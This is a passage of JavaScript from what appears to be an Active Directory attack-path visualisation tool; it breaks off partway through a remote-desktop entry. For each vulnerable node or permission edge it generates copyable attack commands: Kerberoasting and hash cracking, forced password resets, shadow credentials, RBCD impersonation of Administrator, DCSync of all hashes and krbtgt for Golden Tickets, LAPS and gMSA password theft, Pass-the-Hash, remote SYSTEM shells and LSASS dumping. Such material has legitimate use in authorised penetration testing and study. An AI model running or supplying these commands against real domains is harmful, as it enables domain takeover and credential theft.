// Extracted from NewOne/adCodex-cyberpunk.html; kept as a classic browser script.

// ---------------------------------------------------------------------------
// findings — attack-path susceptibility checks surfaced as a small popover
// anchored to the graph area when a matching node is selected. To cover
// another technique later, add an entry to FINDINGS; nothing else here
// needs to change.
// ---------------------------------------------------------------------------
function accountName(n) {
  var p = n.properties || {};
  if (p.samaccountname) return p.samaccountname;
  var dn = displayName(n);
  var at = dn.indexOf('@');
  return at !== -1 ? dn.slice(0, at) : dn;
}

function domainToDN(domain) {
  if (!domain) return 'DC=<domain>,DC=<tld>';
  return domain.split('.').filter(Boolean).map(function (p) { return 'DC=' + p.toUpperCase(); }).join(',');
}

var FINDINGS = [
  {
    id: 'kerberoasting',
    label: 'Kerberoastable',
    blurb: 'This account has a Service Principal Name (SPN) set. An authenticated domain user can request a TGS and attempt to recover the account password offline; success depends on the ticket encryption and password strength.',
    appliesTo: function (n) { return n.kind === 'User' && propertyValue(n, ['hasspn']) === true; },
    commands: function (n) {
      var sam = accountName(n);
      var domain = (n.properties && n.properties.domain) || '<DOMAIN>';
      var dn = domainToDN(n.properties && n.properties.domain);
      return {
        linux: [
          { label: 'Impacket \u2014 request TGS, output crackable hash',
            cmd: 'GetUserSPNs.py ' + domain + '/<user>:<password> -dc-ip <dc-ip> -request -outputfile ' + sam + '_kerberoast.txt' },
          { label: 'NXC \u2014 kerberoasting',
            cmd: 'nxc ldap <dc-ip> -u <user> -p <password> --kerberoasting ' + sam + '_nxc.txt' },
          { label: 'ldapsearch \u2014 confirm the SPN (no ticket requested)',
            cmd: 'ldapsearch -x -H ldap://<dc-ip> -D "<user>@' + domain + '" -w <password> -b "' + dn + '" "(&(objectClass=user)(sAMAccountName=' + sam + '))" servicePrincipalName' },
          { label: 'hashcat \u2014 crack the extracted TGS hash',
            cmd: 'hashcat -m 13100 ' + sam + '_kerberoast.txt /path/to/wordlist.txt' }
        ],
        windows: [
          { label: 'Rubeus \u2014 request TGS, output crackable hash',
            cmd: 'Rubeus.exe kerberoast /user:' + sam + ' /nowrap' },
          { label: 'PowerView \u2014 confirm the SPN (no ticket requested)',
            cmd: 'Get-DomainUser -Identity ' + sam + ' -SPN | Select-Object samaccountname,serviceprincipalname' },
          { label: 'RSAT AD module \u2014 confirm the SPN (no ticket requested)',
            cmd: 'Get-ADUser -Identity ' + sam + ' -Properties ServicePrincipalName | Select-Object ServicePrincipalName' },
          { label: 'setspn \u2014 built-in, no extra tooling needed',
            cmd: 'setspn.exe -L ' + sam }
        ]
      };
    }
  }
];

function findingCmdGroupHtml(cmds, os, active) {
  return '<div class="findingCmdGroup" data-os="' + os + '"' + (active ? '' : ' style="display:none"') + '>' +
    cmds.map(function (c) {
      return '<div class="findingCmd">' +
        '<div class="findingCmdLabel">' + escapeHtml(c.label) + '</div>' +
        '<div class="findingCmdRow">' +
          '<div class="findingCmdCode">' + escapeHtml(c.cmd) + '</div>' +
          '<button type="button" class="findingCopyBtn" data-cmd="' + escapeHtml(c.cmd) + '">Copy</button>' +
        '</div></div>';
    }).join('') + '</div>';
}

// Default view is Linux since that's the far more common AD attack-tooling
// platform (Impacket/NXC/hashcat); Windows is one tab away.
function renderFindingPanel(node) {
  var panel = byId('findingPanel');
  var match = null;
  for (var i = 0; i < FINDINGS.length; i++) {
    if (FINDINGS[i].appliesTo(node)) { match = FINDINGS[i]; break; }
  }
  if (!match) { panel.style.display = 'none'; panel.innerHTML = ''; return; }

  var cmds = match.commands(node);
  panel.innerHTML =
    '<div class="findingHead">' +
      '<span class="findingDot"></span>' +
      '<span class="findingTitle">' + escapeHtml(match.label) + '</span>' +
      '<button type="button" class="findingClose" aria-label="Dismiss">\u00D7</button>' +
    '</div>' +
    '<div class="findingBlurb">' + escapeHtml(match.blurb) + '</div>' +
    '<div class="findingTabs">' +
      '<button type="button" class="findingTab active" data-os="linux">Linux</button>' +
      '<button type="button" class="findingTab" data-os="windows">Windows</button>' +
    '</div>' +
    '<div class="findingBody">' +
      findingCmdGroupHtml(cmds.linux, 'linux', true) +
      findingCmdGroupHtml(cmds.windows, 'windows', false) +
    '</div>';
  panel.style.display = 'flex';
}

function hideFindingPanel() {
  var panel = byId('findingPanel');
  panel.style.display = 'none';
  panel.innerHTML = '';
}

function legacyCopy(text, done) {
  try {
    var ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    var ok = document.execCommand('copy');
    document.body.removeChild(ta);
    done(ok);
  } catch (err) {
    done(false);
  }
}

function copyFindingCmd(btn) {
  var text = btn.getAttribute('data-cmd') || '';
  function done(ok) {
    btn.textContent = ok ? 'Copied' : 'Failed';
    btn.classList.toggle('copied', ok);
    setTimeout(function () { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 1200);
  }
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(text).then(function () { done(true); }).catch(function () { legacyCopy(text, done); });
  } else {
    legacyCopy(text, done);
  }
}

// ---------------------------------------------------------------------------
// edge findings
// ---------------------------------------------------------------------------
// ---------------------------------------------------------------------------
// edge findings — click any relationship line in the graph that represents a
// misconfiguration or exploitable ACL/access right to see validation commands.
// Extend by adding entries to EDGE_FINDINGS; nothing else needs changing.
// ---------------------------------------------------------------------------
function edgeSam(n) { return n ? accountName(n) : '<unknown>'; }
function edgeDomain(n) { return (n && n.properties && n.properties.domain) || '<DOMAIN>'; }
function edgeFqdn(n) { return (n && n.properties && n.properties.name) || edgeSam(n); }
function edgeHost(n) { var f = edgeFqdn(n); return f.indexOf('.') !== -1 ? f.split('.')[0].toLowerCase() : f.toLowerCase(); }

var EDGE_FINDINGS = [

  // ── ACL EDGES ─────────────────────────────────────────────────────────────

  { id: 'genericall', label: 'GenericAll — Full Control',
    blurb: function(e, from, to) {
      var m = {
        User:     'Full control of this user. Force a password reset, inject an SPN for targeted Kerberoasting, write shadow credentials via msDS-KeyCredentialLink, or modify the DACL to grant any right.',
        Computer: 'Full control of this computer object. Write msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD, inject shadow credentials to obtain a machine-account hash, or take ownership of the DACL.',
        Group:    'Full control of this group. Add any controlled principal to inherit its local admin assignments, GPO scope, or AD rights.',
        Domain:   'Full control of the domain object. Grant yourself GetChanges + GetChangesAll, then DCSync every account hash including krbtgt.',
        GPO:      'Full control of this GPO. Modify startup/logon scripts, scheduled tasks, or registry values to push payloads to every system in scope.',
        OU:       'Full control of this OU. Link a malicious GPO or grant yourself GenericAll on all child objects it contains.'
      };
      return m[to && to.kind] || 'Full control of the target object. Modify any attribute, take ownership, rewrite the DACL, or grant any right.';
    },
    appliesTo: function(e) { return /^GenericAll$/i.test(e.kind); },
    commands: function(e, from, to) {
      var s = edgeSam(to), d = edgeDomain(to), fqdn = edgeFqdn(to), host = edgeHost(to);
      if (to && to.kind === 'User') return {
        linux: [
          { label: 'bloodyAD — force password reset',
            cmd: "bloodyAD -u '<user>' -p '<password>' -d " + d + " --host <dc-ip> set password " + s + " 'NewP@ssword123!'" },
          { label: 'rpcclient — force password reset (setuserinfo2 level 23)',
            cmd: "rpcclient -U '<domain>/<user>%<password>' <dc-ip> -c \"setuserinfo2 " + s + " 23 'NewP@ssword123!'\"" },
          { label: 'addspn.py — inject SPN for targeted Kerberoasting',
            cmd: "addspn.py -u '<domain>\\<user>' -p '<password>' -s 'http/fake.attacker.local' -t '" + s + "' <dc-ip>" },
          { label: 'GetUserSPNs.py — request and capture the TGS hash',
            cmd: "GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc-ip> -request -outputfile " + s + "_tgs.txt && hashcat -m 13100 " + s + "_tgs.txt /path/to/wordlist.txt" },
        ],
        windows: [
          { label: 'PowerView — force password reset',
            cmd: "Set-DomainUserPassword -Identity " + s + " -AccountPassword (ConvertTo-SecureString 'NewP@ssword123!' -AsPlainText -Force)" },
          { label: 'PowerView — inject SPN for targeted Kerberoasting then Rubeus',
            cmd: "Set-DomainObject -Identity " + s + " -Set @{serviceprincipalname='http/fake.attacker.local'}" },
          { label: 'Rubeus — request the TGS after SPN injection',
            cmd: "Rubeus.exe kerberoast /user:" + s + " /nowrap" },
          { label: 'Whisker — shadow credentials via msDS-KeyCredentialLink',
            cmd: "Whisker.exe add /target:" + s },
        ]
      };
      if (to && to.kind === 'Computer') return {
        linux: [
          { label: 'rbcd.py — write RBCD attribute',
            cmd: "rbcd.py -f '<attacker-machine>$' -t '" + s + "' -dc-ip <dc-ip> -action write '<domain>\\<user>:<password>'" },
          { label: 'getST.py — S4U2Self + S4U2Proxy (impersonate Administrator)',
            cmd: "getST.py -spn 'cifs/" + host + "' -impersonate Administrator -dc-ip <dc-ip> '<domain>\\<attacker-machine>$:<ntlm-hash>'" },
          { label: 'wmiexec.py — use the ticket for lateral movement',
            cmd: "export KRB5CCNAME=Administrator.ccache && wmiexec.py -k -no-pass '<domain>/Administrator@" + fqdn + "'" },
          { label: 'pywhisker — shadow credentials on machine account',
            cmd: "pywhisker.py -d " + d + " -u '<user>' -p '<password>' --target '" + s + "' --action add" },
        ],
        windows: [
          { label: 'PowerView — write RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)',
            cmd: "$sid=(Get-DomainComputer '<attacker-machine>' -Properties objectsid).objectsid; $sd=New-Object Security.AccessControl.RawSecurityDescriptor \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)\"; $b=New-Object byte[]($sd.BinaryLength); $sd.GetBinaryForm($b,0); Get-DomainComputer " + s + " | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$b}" },
          { label: 'Rubeus — S4U2Self + S4U2Proxy → Administrator TGS',
            cmd: "Rubeus.exe s4u /user:<attacker-machine>$ /rc4:<ntlm-hash> /impersonateuser:Administrator /msdsspn:cifs/" + host + " /nowrap" },
          { label: 'Whisker — shadow credentials on machine account',
            cmd: "Whisker.exe add /target:" + s },
        ]
      };
      if (to && to.kind === 'Group') return {
        linux: [
          { label: 'bloodyAD — add controlled account to group',
            cmd: "bloodyAD -u '<user>' -p '<password>' -d " + d + " --host <dc-ip> add groupMember '" + s + "' '<controlled-user>'" },
          { label: 'net rpc — add member (Samba built-in)',
            cmd: "net rpc group addmem '" + s + "' '<controlled-user>' -U '<domain>/<user>%<password>' -S <dc-ip>" },
        ],
        windows: [
          { label: 'PowerView — add to group',
            cmd: "Add-DomainGroupMember -Identity '" + s + "' -Members '<controlled-user>'" },
          { label: 'Active Directory module',
            cmd: "Add-ADGroupMember -Identity '" + s + "' -Members '<controlled-user>'" },
          { label: 'net.exe (built-in)',
            cmd: "net group '" + s + "' <controlled-user> /add /domain" },
        ]
      };
      var dn = domainToDN(d);
      return {
        linux: [
          { label: 'dacledit.py — grant yourself DCSync rights on the domain',
            cmd: "dacledit.py -action write -rights DCSync -principal '<user>' -target-dn '" + dn + "' -dc-ip <dc-ip> '<domain>\\<user>:<password>'" },
          { label: 'secretsdump.py — DCSync after granting rights',
            cmd: "secretsdump.py '<domain>/<user>:<password>@<dc-ip>'" },
        ],
        windows: [
          { label: 'PowerView — grant DCSync rights on domain object',
            cmd: "Add-DomainObjectAcl -TargetIdentity '" + s + "' -PrincipalIdentity '<controlled-user>' -Rights DCSync" },
          { label: 'Mimikatz — DCSync all accounts after rights are granted',
            cmd: "lsadump::dcsync /domain:" + d + " /all /csv" },
        ]
      };
    }
  },

  { id: 'genericwrite', label: 'GenericWrite — Writable Attributes',
    blurb: 'Write access to non-protected attributes on the target. On users: inject an SPN for targeted Kerberoasting or write shadow credentials via msDS-KeyCredentialLink. On computers: write RBCD. On groups: add members directly.',
    appliesTo: function(e) { return /^GenericWrite$/i.test(e.kind); },
    commands: function(e, from, to) {
      var s = edgeSam(to), d = edgeDomain(to), host = edgeHost(to);
      if (to && to.kind === 'User') return {
        linux: [
          { label: 'bloodyAD — inject SPN (targeted Kerberoasting)',
            cmd: "bloodyAD -u '<user>' -p '<password>' -d " + d + " --host <dc-ip> set object '" + s + "' servicePrincipalName -v 'http/fake.attacker.local'" },
          { label: 'GetUserSPNs.py — request TGS hash after SPN injection',
            cmd: "GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc-ip> -request -outputfile " + s + "_tgs.txt && hashcat -m 13100 " + s + "_tgs.txt /path/to/wordlist.txt" },
          { label: 'pywhisker — shadow credentials via msDS-KeyCredentialLink',
            cmd: "pywhisker.py -d " + d + " -u '<user>' -p '<password>' --target '" + s + "' --action add" },
        ],
        windows: [
          { label: 'PowerView — inject SPN for targeted Kerberoasting',
            cmd: "Set-DomainObject -Identity " + s + " -Set @{serviceprincipalname='http/fake.attacker.local'}" },
          { label: 'Rubeus — request the TGS',
            cmd: "Rubeus.exe kerberoast /user:" + s + " /nowrap" },
          { label: 'Whisker — shadow credentials',
            cmd: "Whisker.exe add /target:" + s },
        ]
      };
      if (to && to.kind === 'Computer') return {
        linux: [
          { label: 'rbcd.py — write RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)',
            cmd: "rbcd.py -f '<attacker-machine>$' -t '" + s + "' -dc-ip <dc-ip> -action write '<domain>\\<user>:<password>'" },
          { label: 'pywhisker — shadow credentials on machine account',
            cmd: "pywhisker.py -d " + d + " -u '<user>' -p '<password>' --target '" + s + "' --action add" },
        ],
        windows: [
          { label: 'PowerView — write RBCD attribute',
            cmd: "$sid=(Get-DomainComputer '<attacker-machine>' -Properties objectsid).objectsid; $sd=New-Object Security.AccessControl.RawSecurityDescriptor \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)\"; $b=New-Object byte[]($sd.BinaryLength); $sd.GetBinaryForm($b,0); Get-DomainComputer " + s + " | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$b}" },
          { label: 'Whisker — shadow credentials',
            cmd: "Whisker.exe add /target:" + s },
        ]
      };
      if (to && to.kind === 'Group') return {
        linux: [
          { label: 'bloodyAD — add controlled account to group',
            cmd: "bloodyAD -u '<user>' -p '<password>' -d " + d + " --host <dc-ip> add groupMember '" + s + "' '<controlled-user>'" },
          { label: 'net rpc — add member',
            cmd: "net rpc group addmem '" + s + "' '<controlled-user>' -U '<domain>/<user>%<password>' -S <dc-ip>" },
        ],
        windows: [
          { label: 'PowerView — add to group',
            cmd: "Add-DomainGroupMember -Identity '" + s + "' -Members '<controlled-user>'" },
          { label: 'net.exe (built-in)',
            cmd: "net group '" + s + "' <controlled-user> /add /domain" },
        ]
      };
      return {
        linux: [
          { label: 'bloodyAD — set arbitrary attribute on target',
            cmd: "bloodyAD -u '<user>' -p '<password>' -d " + d + " --host <dc-ip> set object '" + s + "' <attribute> -v '<value>'" },
        ],
        windows: [
          { label: 'PowerView — set arbitrary attribute',
            cmd: "Set-DomainObject -Identity '" + s + "' -Set @{<attribute>='<value>'}" },
        ]
      };
    }
  },

  { id: 'writedacl', label: 'WriteDacl — Modify DACL',
    blurb: 'Write access to the target object\'s DACL. Grant yourself or a controlled account any right — DCSync on domain objects, GenericAll on users/groups/computers — then exploit that right.',
    appliesTo: function(e) { return /^WriteDacl$/i.test(e.kind); },
    commands: function(e, from, to) {
      var s = edgeSam(to), d = edgeDomain(to), dn = domainToDN(d);
      return {
        linux: [
          { label: 'dacledit.py — grant DCSync rights on domain object',
            cmd: "dacledit.py -action write -rights DCSync -principal '<user>' -target-dn '" + dn + "' -dc-ip <dc-ip> '<domain>\\<user>:<password>'" },
          { label: 'dacledit.py — grant GenericAll on specific object',
            cmd: "dacledit.py -action write -rights FullControl -principal '<user>' -target '" + s + "' -dc-ip <dc-ip> '<domain>\\<user>:<password>'" },
          { label: 'secretsdump.py — DCSync after granting replication rights',
            cmd: "secretsdump.py '<domain>/<user>:<password>@<dc-ip>'" },
        ],
        windows: [
          { label: 'PowerView — grant DCSync rights',
            cmd: "Add-DomainObjectAcl -TargetIdentity '" + s + "' -PrincipalIdentity '<controlled-user>' -Rights DCSync" },
          { label: 'PowerView — grant GenericAll (full control)',
            cmd: "Add-DomainObjectAcl -TargetIdentity '" + s + "' -PrincipalIdentity '<controlled-user>' -Rights All" },
          { label: 'Mimikatz — DCSync after granting rights',
            cmd: "lsadump::dcsync /domain:" + d + " /all /csv" },
        ]
      };
    }
  },

  { id: 'writeowner', label: 'WriteOwner — Take Ownership',
    blurb: 'Can change the owner of the target object. Setting yourself as owner implicitly grants WriteDacl — use that to escalate to GenericAll, then fully control the object.',
    appliesTo: function(e) { return /^WriteOwner$/i.test(e.kind); },
    commands: function(e, from, to) {
      var s = edgeSam(to), d = edgeDomain(to);
      return {
        linux: [
          { label: 'owneredit.py — take ownership of target',
            cmd: "owneredit.py -action write -new-owner '<user>' -target '" + s + "' -dc-ip <dc-ip> '<domain>\\<user>:<password>'" },
          { label: 'dacledit.py — grant WriteDacl after taking ownership',
            cmd: "dacledit.py -action write -rights WriteDacl -principal '<user>' -target '" + s + "' -dc-ip <dc-ip> '<domain>\\<user>:<password>'" },
          { label: 'dacledit.py — escalate to GenericAll via WriteDacl',
            cmd: "dacledit.py -action write -rights FullControl -principal '<user>' -target '" + s + "' -dc-ip <dc-ip> '<domain>\\<user>:<password>'" },
        ],
        windows: [
          { label: 'PowerView — set owner to controlled principal',
            cmd: "Set-DomainObjectOwner -Identity '" + s + "' -OwnerIdentity '<controlled-user>'" },
          { label: 'PowerView — grant WriteDacl after ownership change',
            cmd: "Add-DomainObjectAcl -TargetIdentity '" + s + "' -PrincipalIdentity '<controlled-user>' -Rights WriteDacl" },
          { label: 'PowerView — escalate to GenericAll',
            cmd: "Add-DomainObjectAcl -TargetIdentity '" + s + "' -PrincipalIdentity '<controlled-user>' -Rights All" },
        ]
      };
    }
  },

  { id: 'owns', label: 'Owns — Object Owner',
    blurb: 'Already the owner of the target object. Object owners have implicit WriteDacl — grant yourself any right directly, then exploit the object.',
    appliesTo: function(e) { return /^Owns$/i.test(e.kind); },
    commands: function(e, from, to) {
      var s = edgeSam(to), d = edgeDomain(to), dn = domainToDN(d);
      return {
        linux: [
          { label: 'dacledit.py — grant GenericAll via implicit WriteDacl',
            cmd: "dacledit.py -action write -rights FullControl -principal '<user>' -target '" + s + "' -dc-ip <dc-ip> '<domain>\\<user>:<password>'" },
          { label: 'dacledit.py — grant DCSync (if target is a domain object)',
            cmd: "dacledit.py -action write -rights DCSync -principal '<user>' -target-dn '" + dn + "' -dc-ip <dc-ip> '<domain>\\<user>:<password>'" },
        ],
        windows: [
          { label: 'PowerView — grant GenericAll (full control)',
            cmd: "Add-DomainObjectAcl -TargetIdentity '" + s + "' -PrincipalIdentity '<controlled-user>' -Rights All" },
          { label: 'PowerView — grant DCSync (domain object only)',
            cmd: "Add-DomainObjectAcl -TargetIdentity '" + s + "' -PrincipalIdentity '<controlled-user>' -Rights DCSync" },
        ]
      };
    }
  },

  { id: 'forcechangepassword', label: 'ForceChangePassword',
    blurb: 'The source principal can reset the destination user’s password without knowing the current one. Resetting may disrupt sessions, services, or MFA enrollment; collection confirms the directory right, not that using it will be operationally safe.',
    appliesTo: function(e) { return /^ForceChangePassword$/i.test(e.kind); },
    commands: function(e, from, to) {
      var s = edgeSam(to), d = edgeDomain(to);
      return {
        linux: [
          { label: 'rpcclient — setuserinfo2 level 23 (Samba built-in)',
            cmd: "rpcclient -U '<domain>/<user>%<password>' <dc-ip> -c \"setuserinfo2 " + s + " 23 'NewP@ssword123!'\"" },
          { label: 'bloodyAD — reset password',
            cmd: "bloodyAD -u '<user>' -p '<password>' -d " + d + " --host <dc-ip> set password " + s + " 'NewP@ssword123!'" },
          { label: 'changepasswd.py — MSRPC password change',
            cmd: "changepasswd.py '<domain>/<user>:<password>@<dc-ip>' -alt-user " + s + " -newpass 'NewP@ssword123!'" },
        ],
        windows: [
          { label: 'PowerView — Set-DomainUserPassword',
            cmd: "Set-DomainUserPassword -Identity " + s + " -AccountPassword (ConvertTo-SecureString 'NewP@ssword123!' -AsPlainText -Force)" },
          { label: 'Active Directory module — Set-ADAccountPassword',
            cmd: "Set-ADAccountPassword -Identity " + s + " -NewPassword (ConvertTo-SecureString 'NewP@ssword123!' -AsPlainText -Force) -Reset" },
          { label: 'net.exe (built-in, no extra tooling)',
            cmd: "net user " + s + " NewP@ssword123! /domain" },
        ]
      };
    }
  },

  { id: 'allextendedrights', label: 'AllExtendedRights',
    blurb: 'The source principal holds all extended rights over the destination object. Effects depend on its type: user objects can include password-reset capability, while domain objects may contribute the replication rights required for DCSync.',
    appliesTo: function(e) { return /^AllExtendedRights$/i.test(e.kind); },
    commands: function(e, from, to) {
      var s = edgeSam(to), d = edgeDomain(to);
      if (to && to.kind === 'Domain') return {
        linux: [
          { label: 'secretsdump.py — DCSync all accounts (GetChanges + GetChangesAll implied)',
            cmd: "secretsdump.py '<domain>/<user>:<password>@<dc-ip>'" },
          { label: 'secretsdump.py — DCSync krbtgt only (Golden Ticket material)',
            cmd: "secretsdump.py '<domain>/<user>:<password>@<dc-ip>' -just-dc-user krbtgt" },
        ],
        windows: [
          { label: 'Mimikatz — DCSync all accounts',
            cmd: "lsadump::dcsync /domain:" + d + " /all /csv" },
          { label: 'Mimikatz — DCSync krbtgt for Golden Ticket',
            cmd: "lsadump::dcsync /domain:" + d + " /user:krbtgt" },
        ]
      };
      return {
        linux: [
          { label: 'bloodyAD — force password reset (ForceChangePassword extended right)',
            cmd: "bloodyAD -u '<user>' -p '<password>' -d " + d + " --host <dc-ip> set password '" + s + "' 'NewP@ssword123!'" },
          { label: 'rpcclient — reset password',
            cmd: "rpcclient -U '<domain>/<user>%<password>' <dc-ip> -c \"setuserinfo2 " + s + " 23 'NewP@ssword123!'\"" },
        ],
        windows: [
          { label: 'PowerView — force password reset',
            cmd: "Set-DomainUserPassword -Identity " + s + " -AccountPassword (ConvertTo-SecureString 'NewP@ssword123!' -AsPlainText -Force)" },
          { label: 'PowerView — inspect which extended rights are present',
            cmd: "Get-DomainObjectAcl -Identity '" + s + "' -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'ExtendedRight'}" },
        ]
      };
    }
  },

  { id: 'addmember', label: 'AddMember / AddSelf — Group Membership Write',
    blurb: 'The source principal can add a member to the destination group, or add itself when the edge is AddSelf. A newly added principal inherits rights assigned to that group, subject to nested membership and policy processing.',
    appliesTo: function(e) { return /^(AddMember|AddSelf)$/i.test(e.kind); },
    commands: function(e, from, to) {
      var s = edgeSam(to), d = edgeDomain(to);
      return {
        linux: [
          { label: 'bloodyAD — add controlled account to group',
            cmd: "bloodyAD -u '<user>' -p '<password>' -d " + d + " --host <dc-ip> add groupMember '" + s + "' '<controlled-user>'" },
          { label: 'net rpc — add member (Samba built-in, no extra tooling)',
            cmd: "net rpc group addmem '" + s + "' '<controlled-user>' -U '<domain>/<user>%<password>' -S <dc-ip>" },
          { label: 'ldapmodify — raw LDAP modification',
            cmd: "ldapmodify -x -H ldap://<dc-ip> -D '<user>@" + d + "' -w '<password>' -f add_member.ldif" },
        ],
        windows: [
          { label: 'PowerView — add to group',
            cmd: "Add-DomainGroupMember -Identity '" + s + "' -Members '<controlled-user>'" },
          { label: 'Active Directory module',
            cmd: "Add-ADGroupMember -Identity '" + s + "' -Members '<controlled-user>'" },
          { label: 'net.exe (built-in)',
            cmd: "net group '" + s + "' <controlled-user> /add /domain" },
        ]
      };
    }
  },

  { id: 'readlapspassword', label: 'ReadLAPSPassword',
    blurb: 'The source principal can read the LAPS-managed local Administrator password stored for the destination computer. A current password may provide local administrator access, subject to password rotation, account configuration, and endpoint reachability.',
    appliesTo: function(e) { return /^ReadLAPSPassword$/i.test(e.kind); },
    commands: function(e, from, to) {
      var s = edgeSam(to), d = edgeDomain(to), host = edgeHost(to);
      return {
        linux: [
          { label: 'NXC — dump all LAPS passwords readable by current account',
            cmd: "nxc ldap <dc-ip> -u '<user>' -p '<password>' -M laps" },
          { label: 'ldapsearch — read ms-Mcs-AdmPwd directly from computer object',
            cmd: "ldapsearch -x -H ldap://<dc-ip> -D '<user>@" + d + "' -w '<password>' -b '" + domainToDN(d) + "' '(sAMAccountName=" + s + ")' ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime" },
          { label: 'pyLAPS — targeted LAPS retrieval',
            cmd: "pyLAPS.py --action get -d " + d + " -u '<user>' -p '<password>' --dc-ip <dc-ip>" },
        ],
        windows: [
          { label: 'LAPS PowerShell module — Get-AdmPwdPassword',
            cmd: "Get-AdmPwdPassword -ComputerName " + host },
          { label: 'PowerView — read ms-Mcs-AdmPwd attribute directly',
            cmd: "Get-DomainComputer " + s + " -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime" },
          { label: 'Active Directory module — raw attribute read',
            cmd: "Get-ADComputer " + s + " -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd" },
        ]
      };
    }
  },

  { id: 'readgmsapassword', label: 'ReadGMSAPassword',
    blurb: 'The source principal can read the destination gMSA’s msDS-ManagedPassword material. If collection and access are current, it may be converted into usable credential material; an SPN is a separate requirement for Kerberoasting.',
    appliesTo: function(e) { return /^ReadGMSAPassword$/i.test(e.kind); },
    commands: function(e, from, to) {
      var s = edgeSam(to), d = edgeDomain(to);
      return {
        linux: [
          { label: 'NXC — dump all readable GMSA passwords as NT hashes',
            cmd: "nxc ldap <dc-ip> -u '<user>' -p '<password>' --gmsa" },
          { label: 'gMSADumper.py — targeted GMSA hash extraction',
            cmd: "gMSADumper.py -u '<user>' -p '<password>' -d " + d + " -l <dc-ip>" },
          { label: 'NXC — Pass-the-Hash with extracted NT hash',
            cmd: "nxc smb <target-ip> -u '" + s + "' -H :<nt-hash>" },
        ],
        windows: [
          { label: 'GMSAPasswordReader — extract NT hash directly',
            cmd: "GMSAPasswordReader.exe --AccountName " + s },
          { label: 'Active Directory module — read managed password blob',
            cmd: "$g = Get-ADServiceAccount -Identity " + s + " -Properties msDS-ManagedPassword; (ConvertFrom-ADManagedPasswordBlob $g.'msDS-ManagedPassword').CurrentPassword" },
          { label: 'NXC — Pass-the-Hash after extraction',
            cmd: "nxc smb <target-ip> -u '" + s + "' -H :<nt-hash>" },
        ]
      };
    }
  },

  { id: 'dcsync', label: 'DCSync Rights',
    blurb: 'The source principal has a direct DCSync edge, or the required replication-right combination, against the destination domain. If the permissions remain effective, the principal may request directory replication data, including sensitive account credential material.',
    appliesTo: function(e) { return /^(GetChanges|GetChangesAll|GetChangesInFilteredSet|DCSync)$/i.test(e.kind); },
    commands: function(e, from, to) {
      var d = edgeDomain(to) || (to && to.properties && to.properties.name) || '<DOMAIN>';
      return {
        linux: [
          { label: 'secretsdump.py — DCSync all accounts',
            cmd: "secretsdump.py '<domain>/<user>:<password>@<dc-ip>'" },
          { label: 'secretsdump.py — targeted: krbtgt only (Golden Ticket material)',
            cmd: "secretsdump.py '<domain>/<user>:<password>@<dc-ip>' -just-dc-user krbtgt" },
          { label: 'NXC — dump NTDS from the domain controller',
            cmd: "nxc smb <dc-ip> -u '<user>' -p '<password>' --ntds" },
        ],
        windows: [
          { label: 'Mimikatz — DCSync all accounts',
            cmd: "lsadump::dcsync /domain:" + d + " /all /csv" },
          { label: 'Mimikatz — DCSync krbtgt (Golden Ticket)',
            cmd: "lsadump::dcsync /domain:" + d + " /user:krbtgt" },
          { label: 'Mimikatz — DCSync targeted account',
            cmd: "lsadump::dcsync /domain:" + d + " /user:<target-account>" },
        ]
      };
    }
  },

  // ── ACCESS EDGES ──────────────────────────────────────────────────────────

  { id: 'adminto', label: 'AdminTo — Local Admin Access',
    blurb: 'The source principal was collected as a local administrator on the destination computer. This may enable remote administration and credential access, but network reachability, endpoint controls, UAC restrictions, and credential type still matter.',
    appliesTo: function(e) { return /^AdminTo$/i.test(e.kind); },
    commands: function(e, from, to) {
      var fqdn = edgeFqdn(to);
      return {
        linux: [
          { label: 'NXC SMB — confirm admin and run command',
            cmd: "nxc smb " + fqdn + " -u '<user>' -p '<password>' -x 'whoami /all'" },
          { label: 'psexec.py — SYSTEM shell via SMB named pipes',
            cmd: "psexec.py '<domain>/<user>:<password>@" + fqdn + "'" },
          { label: 'wmiexec.py — semi-interactive shell via WMI (noisier to detect)',
            cmd: "wmiexec.py '<domain>/<user>:<password>@" + fqdn + "'" },
          { label: 'secretsdump.py — remote SAM + LSA + cached credential dump',
            cmd: "secretsdump.py '<domain>/<user>:<password>@" + fqdn + "'" },
        ],
        windows: [
          { label: 'Invoke-Command — remote PowerShell execution',
            cmd: "Invoke-Command -ComputerName " + fqdn + " -Credential (Get-Credential) -ScriptBlock { whoami; hostname }" },
          { label: 'NXC SMB (from Windows) — confirm access',
            cmd: "nxc smb " + fqdn + " -u '<user>' -p '<password>' -x 'whoami'" },
          { label: 'Mimikatz — dump LSASS in-memory creds (once a shell is obtained)',
            cmd: "sekurlsa::logonpasswords" },
        ]
      };
    }
  },

  { id: 'canrdp', label: 'CanRDP — Remote Desktop Access',
    blurb: 'The source principal has collected Remote Desktop access to the destination computer. This indicates possible interactive logon, not local administrator rights; network reachability, logon policy, endpoint controls, and credential restrictions still apply.',
    appliesTo: function(e) { return /^CanRDP$/i.test(e.kind); },
    commands: function(e, from, to) {
      var fqdn = edgeFqdn(to);
      return {
        linux: [
          { label: 'xfreerdp — standard RDP session',
            cmd: "xfreerdp /u:'<user>' /p:'<password>' /d:'<domain>' /v:" + fqdn + " /dynamic-resolution /cert:ignore" },
          { label: 'xfreerdp — Restricted Admin mode (Pass-the-Hash, no plaintext)',
            cmd: "xfreerdp /u:'<user>' /pth:<nt-hash> /d:'<domain>' /v:" + fqdn + " /restrictedadmin /cert:ignore" },
        ],
        windows: [
          { label: 'mstsc.exe — standard RDP',
            cmd: "mstsc.exe /v:" + fqdn },
